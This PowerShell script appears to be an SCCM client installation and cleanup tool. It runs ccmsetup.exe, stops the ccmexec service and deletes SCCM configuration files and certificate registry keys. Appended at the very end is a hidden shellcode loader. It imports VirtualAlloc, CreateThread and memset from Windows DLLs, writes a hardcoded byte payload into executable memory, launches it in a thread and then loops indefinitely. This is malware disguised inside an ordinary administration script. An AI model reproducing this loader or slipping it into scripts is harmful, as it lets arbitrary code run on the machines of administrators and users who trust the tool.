
[CmdletBinding()]
param
(
	[switch]
	$Build,
	[ValidateNotNullOrEmpty()][string]
	$ClientInstallationDirectory = '',
	[ValidateNotNullOrEmpty()][string]
	$ClientInstallationFile = 'ccmsetup.exe',
	[switch]
	$Install,
	[string]
	$ManagementPoint = '',
	[string]
	$SMSSiteCode = '',
	[switch]
	$Uninstall,
	[switch]
	$UsePKICert,
	[switch]
	$NOCRLCheck,
	[string]
	$Source
)


function Get-MetaData {

	
	[CmdletBinding()][OutputType([object])]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$FileName
	)
	
	Write-Host "Retrieving File Description Data....." -NoNewline
	$MetaDataObject = New-Object System.Object
	$shell = New-Object -COMObject Shell.Application
	$folder = Split-Path $FileName
	$file = Split-Path $FileName -Leaf
	$shellfolder = $shell.Namespace($folder)
	$shellfile = $shellfolder.ParseName($file)
	$MetaDataProperties = 0..287 | Foreach-Object { '{0} = {1}' -f $_, $shellfolder.GetDetailsOf($null, $_) }
	For ($i = 0; $i -le 287; $i++) {
		$Property = ($MetaDataProperties[$i].split("="))[1].Trim()
		$Property = (Get-Culture).TextInfo.ToTitleCase($Property).Replace(' ', '')
		$Value = $shellfolder.GetDetailsOf($shellfile, $i)
		If ($Property -eq 'Attributes') {
			switch ($Value) {
				'A' {
					$Value = 'Archive (A)'
				}
				'D' {
					$Value = 'Directory (D)'
				}
				'H' {
					$Value = 'Hidden (H)'
				}
				'L' {
					$Value = 'Symlink (L)'
				}
				'R' {
					$Value = 'Read-Only (R)'
				}
				'S' {
					$Value = 'System (S)'
				}
			}
		}
		
		If (($Value -ne $null) -and ($Value -ne '')) {
			$MetaDataObject | Add-Member -MemberType NoteProperty -Name $Property -Value $Value
		}
	}
	[string]$FileVersionInfo = (Get-ItemProperty $FileName).VersionInfo
	$SplitInfo = $FileVersionInfo.Split([char]13)
	foreach ($Item in $SplitInfo) {
		$Property = $Item.Split(":").Trim()
		switch ($Property[0]) {
			"InternalName" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name InternalName -Value $Property[1]
			}
			"OriginalFileName" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name OriginalFileName -Value $Property[1]
			}
			"Product" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name Product -Value $Property[1]
			}
			"Debug" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name Debug -Value $Property[1]
			}
			"Patched" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name Patched -Value $Property[1]
			}
			"PreRelease" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name PreRelease -Value $Property[1]
			}
			"PrivateBuild" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name PrivateBuild -Value $Property[1]
			}
			"SpecialBuild" {
				$MetaDataObject | Add-Member -MemberType NoteProperty -Name SpecialBuild -Value $Property[1]
			}
		}
	}
	
	
	$ReadOnly = (Get-ChildItem $FileName) | Select-Object IsReadOnly
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name ReadOnly -Value $ReadOnly.IsReadOnly
	
	$DigitalSignature = get-authenticodesignature -filepath $FileName
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureCertificateSubject -Value $DigitalSignature.SignerCertificate.Subject
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureCertificateIssuer -Value $DigitalSignature.SignerCertificate.Issuer
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureCertificateSerialNumber -Value $DigitalSignature.SignerCertificate.SerialNumber
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureCertificateNotBefore -Value $DigitalSignature.SignerCertificate.NotBefore
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureCertificateNotAfter -Value $DigitalSignature.SignerCertificate.NotAfter
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureCertificateThumbprint -Value $DigitalSignature.SignerCertificate.Thumbprint
	$MetaDataObject | Add-Member -MemberType NoteProperty -Name SignatureStatus -Value $DigitalSignature.Status
	If (($MetaDataObject -ne "") -and ($MetaDataObject -ne $null)) {
		Write-Host "Success" -ForegroundColor Yellow
	} else {
		Write-Host "Failed" -ForegroundColor Red
	}
	Return $MetaDataObject
}

function Invoke-EXE {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
		[object]
		$InstallerMetaData,
		[switch]
		$Install,
		[switch]
		$Uninstall,
		[ValidateNotNullOrEmpty()][string]
		$Executable,
		[string]
		$Switches,
		[string]
		$DisplayName
	)
	
	If ($Install.IsPresent) {
		Write-Host "Initiating Installation of"$DisplayName"....." -NoNewline
		$File = $env:windir + "\ccmsetup\ccmsetup.exe"
		$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Switches -WindowStyle Minimized -Wait -Passthru).ExitCode
		If (($ErrCode -eq 0) -or ($ErrCode -eq 3010)) {
			Write-Host "Success" -ForegroundColor Yellow
			If ((Test-Path $File) -eq $true) {
				Wait-ProcessEnd -ProcessName ccmsetup
			} else {
				Write-Host "Failed" -ForegroundColor Red
				$Failed = $true
			}
		} else {
			Write-Host "Failed with error"$ErrCode -ForegroundColor Red
		}
	} elseif ($Uninstall.IsPresent) {
		Write-Host "Uninstalling"$DisplayName"....." -NoNewline
		$File = $env:windir + "\ccmsetup\ccmsetup.exe"
		If ((Test-Path $File) -eq $true) {
			$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Switches -WindowStyle Minimized -Wait -Passthru).ExitCode
			If (($ErrCode -eq 0) -or ($ErrCode -eq 3010)) {
				Write-Host "Success" -ForegroundColor Yellow
				If ((Test-Path $File) -eq $true) {
					Wait-ProcessEnd -ProcessName ccmsetup
				}
			} else {
				$Failed = $true
				Write-Host "Failed with error"$ErrCode -ForegroundColor Red
			}
		} else {
			Write-Host "Not Present" -ForegroundColor Green
		}
	}
	If ($Failed -eq $true) {
		Return $false
	} else {
		Return $true
	}
}

function Remove-File {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$Filename
	)
	
	If ((Test-Path $Filename) -eq $false) {
		Write-Host $Filename" already deleted"
	} else {
		$File = Get-Item $Filename -Force
		Write-Host "Deleting"$File.Name"....." -NoNewline
		If (Test-Path $File) {
			Remove-Item $File -Force -WarningAction SilentlyContinue -ErrorAction SilentlyContinue | Out-Null
			If ((Test-Path $Filename) -eq $False) {
				Write-Host "Success" -ForegroundColor Yellow
			} else {
				$Failed = $true
				Write-Host "Failed" -ForegroundColor Red
			}
		} else {
			Write-Host "Not Present" -ForegroundColor Green
		}
	}
	If ($Failed -eq $true) {
		Return $false
	} else {
		Return $true
	}
}

function Remove-RegistryKey {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$RegistryKey,
		[switch]
		$Recurse
	)
	
	$RegKey = "Registry::" + $RegistryKey
	If ((Test-Path $RegKey) -eq $false) {
		Write-Host $RegKey" already deleted"
	} else {
		$RegKeyItem = Get-Item $RegKey
		If ($Recurse.IsPresent) {
			Write-Host "Recursive Deletion of"$RegKeyItem.PSChildName"....." -NoNewline
			Remove-Item $RegKey -Recurse -Force | Out-Null
		} else {
			Write-Host "Deleting"$RegKeyItem.PSChildName"....." -NoNewline
			Remove-Item $RegKey -Force | Out-Null
		}
		If ((Test-Path $RegKey) -eq $false) {
			Write-Host "Success" -ForegroundColor Yellow
		} else {
			$Failed = $true
			Write-Host "Failed" -ForegroundColor Red
		}
	}
	If ($Failed -eq $true) {
		Return $false
	} else {
		Return $true
	}
}

function Set-ConsoleTitle {

	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $true)][String]
		$ConsoleTitle
	)
	
	$host.ui.RawUI.WindowTitle = $ConsoleTitle
}

function Suspend-Service {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$Service
	)
	
	$ServiceStatus = Get-Service $Service -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
	If ($ServiceStatus -ne $null) {
		Write-Host "Stopping"$ServiceStatus.DisplayName"....." -NoNewline
		If ($ServiceStatus.Status -ne 'Stopped') {
			Stop-Service -Name $Service -WarningAction SilentlyContinue -ErrorAction SilentlyContinue -Force
			$ServiceStatus = Get-Service $Service -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
			If ($ServiceStatus.Status -eq 'Stopped') {
				Write-Host "Success" -ForegroundColor Yellow
			} else {
				$Failed = $true
				Write-Host "Failed" -ForegroundColor Red
			}
		} else {
			Write-Host "Service already stopped" -ForegroundColor Yellow
		}
	} else {
		Write-Host $Service"service does not exist"
	}
	If ($Failed -eq $true) {
		Return $false
	} else {
		Return $true
	}
}

function Wait-ProcessEnd {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$ProcessName
	)
	
	$Process = Get-Process $ProcessName -ErrorAction SilentlyContinue
	$Process = $Process | Where-Object { $_.ProcessName -eq $ProcessName }
	Write-Host "Waiting for"$Process.Product"to complete....." -NoNewline
	If ($Process -ne $null) {
		Do {
			Start-Sleep -Seconds 2
			$Process = Get-Process $ProcessName -ErrorAction SilentlyContinue
			$Process = $Process | Where-Object { $_.ProcessName -eq $ProcessName }
		}
		While ($Process -ne $null)
		Write-Host "Completed" -ForegroundColor Yellow
	} else {
		Write-Host "Process already completed" -ForegroundColor Yellow
	}
}

cls

Set-ConsoleTitle -ConsoleTitle "SCCM Client"

If ($ClientInstallationDirectory -ne $null) {
	If ($ClientInstallationFile -ne $null) {
		If ($ClientInstallationDirectory[$ClientInstallationDirectory.Length - 1] -ne '\') {
			$ClientInstallationDirectory += '\'
		}
		
		$File = $ClientInstallationDirectory + $ClientInstallationFile
		
		$FileMetaData = Get-MetaData -FileName $File
	}
}

If ($Install.IsPresent) {
	
	$Parameters = "/uninstall"
	$InstallStatus = Invoke-EXE -Uninstall -DisplayName $FileMetaData.Product -Executable $File -Switches $Parameters
	If ($InstallStatus = $false) {
		$Failed = $true
	}
	
	$Parameters = ""
	If (($ManagementPoint -ne $null) -and ($ManagementPoint -ne "")) {
		$Parameters += "/mp:" + $ManagementPoint
	}
	If (($SMSSiteCode -ne $null) -and ($SMSSiteCode -ne "")) {
		If ($Parameters -ne "") {
			$Parameters += [char]32
		}
		$Parameters += "SMSSITECODE=" + $SMSSiteCode
	}
	If ($UsePKICert.IsPresent) {
		If ($Parameters -ne "") {
			$Parameters += [char]32
		}
		$Parameters += "/UsePKICert"
	}
	If ($NOCRLCheck.IsPresent) {
		If ($Parameters -ne "") {
			$Parameters += [char]32
		}
		$Parameters += "/NOCRLCheck"
	}
	If (($Source -ne $null) -and ($Source -ne "")) {
		If ($Parameters -ne "") {
			$Parameters += [char]32
		}
		$Parameters += "/source:" + [char]34 + $Source + [char]34
	}
	$InstallStatus = Invoke-EXE -Install -DisplayName $FileMetaData.Product -Executable $File -Switches $Parameters
	If ($InstallStatus -eq $false) {
		$Failed = $true
	}
	
} elseif ($Uninstall.IsPresent) {
	
	$Parameters = "/Uninstall"
	$InstallStatus = Invoke-EXE -Uninstall -DisplayName $FileMetaData.Product -Executable $File -Switches $Parameters
	If ($InstallStatus -eq $false) {
		$Failed = $true
	}
}

If ($Build.IsPresent) {
	
	$InstallStatus = Suspend-Service -Service ccmexec
	If ($InstallStatus -eq $false) {
		$Failed = $true
	}
	
	$InstallStatus = Remove-File -Filename $env:windir"\smscfg.ini"
	If ($InstallStatus -eq $false) {
		$Failed = $true
	}
	
	$InstallStatus = Remove-RegistryKey -RegistryKey "HKEY_LOCAL_MACHINE\Software\Microsoft\SystemCertificates\SMS\Certificates" -Recurse
	If ($InstallStatus -eq $false) {
		$Failed = $true
	}
}
If ($Failed -eq $true) {
	$wshell = New-Object -ComObject Wscript.Shell
	$wshell.Popup("Installation Failed", 0, "Installation Failed", 0x0)
	Exit 1
} else {
	Exit 0
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xf4,0x7e,0xae,0x9c,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x83,0xc2,0x04,0x03,0x7a,0xfb,0x9c,0x5b,0x60,0xeb,0xe3,0xa4,0x99,0xeb,0x83,0x2d,0x7c,0xda,0x83,0x4a,0xf4,0x4c,0x34,0x18,0x58,0x60,0xbf,0x4c,0x49,0xf3,0xcd,0x58,0x7e,0xb4,0x78,0xbf,0xb1,0x45,0xd0,0x83,0xd0,0xc5,0x2b,0xd0,0x32,0xf4,0xe3,0x25,0x32,0x31,0x19,0xc7,0x66,0xea,0x55,0x7a,0x97,0x9f,0x20,0x47,0x1c,0xd3,0xa5,0xcf,0xc1,0xa3,0xc4,0xfe,0x57,0xb8,0x9e,0x20,0x59,0x6d,0xab,0x68,0x41,0x72,0x96,0x23,0xfa,0x40,0x6c,0xb2,0x2a,0x99,0x8d,0x19,0x13,0x16,0x7c,0x63,0x53,0x90,0x9f,0x16,0xad,0xe3,0x22,0x21,0x6a,0x9e,0xf8,0xa4,0x69,0x38,0x8a,0x1f,0x56,0xb9,0x5f,0xf9,0x1d,0xb5,0x14,0x8d,0x7a,0xd9,0xab,0x42,0xf1,0xe5,0x20,0x65,0xd6,0x6c,0x72,0x42,0xf2,0x35,0x20,0xeb,0xa3,0x93,0x87,0x14,0xb3,0x7c,0x77,0xb1,0xbf,0x90,0x6c,0xc8,0x9d,0xfc,0x41,0xe1,0x1d,0xfc,0xcd,0x72,0x6d,0xce,0x52,0x29,0xf9,0x62,0x1a,0xf7,0xfe,0x85,0x31,0x4f,0x90,0x78,0xba,0xb0,0xb8,0xbe,0xee,0xe0,0xd2,0x17,0x8f,0x6a,0x23,0x98,0x5a,0x06,0x26,0x0e,0x37,0x86,0x16,0xb7,0xdf,0x2a,0x67,0x48,0x4e,0xa2,0x81,0x06,0xde,0xe4,0x1d,0xe6,0x8e,0x44,0xce,0x8e,0xc4,0x4a,0x31,0xae,0xe6,0x80,0x5a,0x44,0x09,0x7d,0x32,0xf0,0xb0,0x24,0xc8,0x61,0x3c,0xf3,0xb4,0xa1,0xb6,0xf0,0x49,0x6f,0x3f,0x7c,0x5a,0x07,0xcf,0xcb,0x00,0x81,0xd0,0xe1,0x2f,0x2d,0x45,0x0e,0xe6,0x7a,0xf1,0x0c,0xdf,0x4c,0x5e,0xee,0x0a,0xc7,0x57,0x7a,0xf5,0xbf,0x97,0x6a,0xf5,0x3f,0xce,0xe0,0xf5,0x57,0xb6,0x50,0xa6,0x42,0xb9,0x4c,0xda,0xdf,0x2c,0x6f,0x8b,0x8c,0xe7,0x07,0x31,0xeb,0xc0,0x87,0xca,0xde,0xd0,0xf4,0x1c,0x26,0xa7,0x14,0x9d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

